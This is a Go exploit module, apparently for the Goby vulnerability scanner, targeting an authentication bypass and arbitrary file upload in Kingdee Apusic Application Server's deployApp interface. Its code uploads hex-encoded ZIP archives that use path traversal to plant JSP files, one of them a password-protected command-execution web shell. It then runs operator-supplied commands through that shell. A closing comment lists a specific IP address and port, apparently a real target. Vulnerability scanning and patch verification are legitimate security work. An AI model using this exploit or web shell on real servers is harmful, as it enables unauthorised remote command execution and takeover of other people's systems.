package exploits

import (
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Kingdee Apusic Application Server deployApp Arbitrary File Upload Vulnerability",
    "Description": "<p>Kingdee Apusic application server is the first pure Java application server in China with its own intellectual property rights following the J2EE standard.</p><p>There is an arbitrary file upload vulnerability in the deployApp interface of the Kingdee Apusic application server. Attackers can use double slashes to bypass authentication and upload malicious compressed packages to take over server permissions.</p>",
    "Product": "APUSIC-App-Server",
    "Homepage": "http://www.kingdee.com/",
    "DisclosureDate": "2023-02-16",
    "Author": "h1ei1",
    "FofaQuery": "title=\"Apusic应用服务器\"",
    "GobyQuery": "title=\"Apusic应用服务器\"",
    "Level": "3",
    "Impact": "<p>There is an arbitrary file upload vulnerability in the deployApp interface of the Kingdee Apusic application server. Attackers can use double slashes to bypass authentication and upload malicious compressed packages to take over server permissions.</p>",
    "Recommendation": "<p>Currently the manufacturer has released security patches, please update in time: <a href=\"http://www.kingdee.com/.\">http://www.kingdee.com/.</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information technology application innovation industry",
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Apusic应用服务器 deployApp 任意文件上传漏洞",
            "Product": "Apusic应用服务器",
            "Description": "<p>金蝶Apusic应用服务器是国内第一个遵循J2EE标准的自有知识产权的纯Java应用服务器。<br></p><p>金蝶Apusic应用服务器 deployApp 接口存在任意文件上传漏洞，攻击者可通过双斜杠绕过鉴权并上传恶意压缩包接管服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布安全补丁，请及时更新：<a href=\"http://www.kingdee.com/\">http://www.kingdee.com/</a>。<br></p>",
            "Impact": "<p>金蝶Apusic应用服务器 deployApp 接口存在任意文件上传漏洞，攻击者可通过双斜杠绕过鉴权并上传恶意压缩包接管服务器权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "信创",
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Kingdee Apusic Application Server deployApp Arbitrary File Upload Vulnerability",
            "Product": "APUSIC-App-Server",
            "Description": "<p>Kingdee Apusic application server is the first pure Java application server in China with its own intellectual property rights following the J2EE standard.<br></p><p>There is an arbitrary file upload vulnerability in the deployApp interface of the Kingdee Apusic application server. Attackers can use double slashes to bypass authentication and upload malicious compressed packages to take over server permissions.<br></p>",
            "Recommendation": "<p>Currently the manufacturer has released security patches, please update in time: <a href=\"http://www.kingdee.com/.\">http://www.kingdee.com/.</a><br></p>",
            "Impact": "<p>There is an arbitrary file upload vulnerability in the deployApp interface of the Kingdee Apusic application server. Attackers can use double slashes to bypass authentication and upload malicious compressed packages to take over server permissions.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "Information technology application innovation industry",
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10805"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			hexPayload, _ := hex.DecodeString("504B030414000000000013B1305676B81B6CC4000000C4000000360000002E2E2F2E2E2F2E2E2F2E2E2F6170706C69636174696F6E732F64656661756C742F7075626C69635F68746D6C2F7368656C6C2E6A73703C256F75742E7072696E746C6E286E657720537472696E67286E65772073756E2E6D6973632E4241534536344465636F64657228292E6465636F646542756666657228225A5445324E5451794D5445784D474A684D444D774F546C684D574D774D7A6B7A4D7A637A597A56694E444D3D222929293B6E6577206A6176612E696F2E46696C65286170706C69636174696F6E2E6765745265616C5061746828726571756573742E676574536572766C657450617468282929292E64656C65746528293B253E504B0102140314000000000013B1305676B81B6CC4000000C4000000360000000000000000000000A481000000002E2E2F2E2E2F2E2E2F2E2E2F6170706C69636174696F6E732F64656661756C742F7075626C69635F68746D6C2F7368656C6C2E6A7370504B0506000000000100010064000000180100000000")
			uri := "/admin//protect/application/deployApp"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryd9acIBdVuqKWDJbd")
			cfg.Data = fmt.Sprintf("------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name=\"appName\"\r\n\r\n111\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name=\"deployInServer\"\r\n\r\nfalse\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name=\"clientFile\"; filename=\"evil.zip\"\r\nContent-Type: application/x-zip-compressed\r\n\r\n%s\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name=\"archivePath\"\r\n\r\n\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name=\"baseContext\"\r\n\r\n\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name=\"startType\"\r\n\r\nauto\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name=\"loadon\"\r\n\r\n\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name=\"virtualHost\"\r\n\r\n\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name=\"allowHosts\"\r\n\r\n\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name=\"denyHosts\"\r\n\r\n\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd--\r\n", string(hexPayload))
			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				uri2 := "/shell.jsp"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "e165421110ba03099a1c0393373c5b43")

				}

			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			hexPayload, _ := hex.DecodeString("504B0304140000000000E57909556B0AC8E76401000064010000370000002E2E2F2E2E2F2E2E2F2E2E2F6170706C69636174696F6E732F64656661756C742F7075626C69635F68746D6C2F7368656C6C322E6A73703C250D0A20202020696620282261646D696E222E657175616C7328726571756573742E676574506172616D65746572282270776422292929207B0D0A20202020202020206A6176612E696F2E496E70757453747265616D20696E707574203D2052756E74696D652E67657452756E74696D6528292E6578656328726571756573742E676574506172616D657465722822636D642229292E676574496E70757453747265616D28293B0D0A2020202020202020696E74206C656E203D202D313B0D0A2020202020202020627974655B5D206279746573203D206E657720627974655B343039325D3B0D0A20202020202020207768696C652028286C656E203D20696E7075742E72656164286279746573292920213D202D3129207B0D0A2020202020202020202020206F75742E7072696E746C6E286E657720537472696E672862797465732C202247424B2229293B0D0A20202020202020207D0D0A202020207D0D0A253E504B01021403140000000000E57909556B0AC8E76401000064010000370000000000000000000000B481000000002E2E2F2E2E2F2E2E2F2E2E2F6170706C69636174696F6E732F64656661756C742F7075626C69635F68746D6C2F7368656C6C322E6A7370504B0506000000000100010065000000B90100000000")
			uri := "/admin//protect/application/deployApp"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryd9acIBdVuqKWDJbd")
			cfg.Data = fmt.Sprintf("------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name=\"appName\"\r\n\r\n111\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name=\"deployInServer\"\r\n\r\nfalse\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name=\"clientFile\"; filename=\"evil.zip\"\r\nContent-Type: application/x-zip-compressed\r\n\r\n%s\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name=\"archivePath\"\r\n\r\n\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name=\"baseContext\"\r\n\r\n\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name=\"startType\"\r\n\r\nauto\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name=\"loadon\"\r\n\r\n\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name=\"virtualHost\"\r\n\r\n\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name=\"allowHosts\"\r\n\r\n\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd\r\nContent-Disposition: form-data; name=\"denyHosts\"\r\n\r\n\r\n------WebKitFormBoundaryd9acIBdVuqKWDJbd--\r\n", string(hexPayload))
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				uri2 := "/shell2.jsp?pwd=admin&cmd=" + cmd
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
					expResult.Output = resp2.RawBody
					expResult.Success = true
				}
			}

			return expResult
		},
	))
}

//111.40.46.8:9191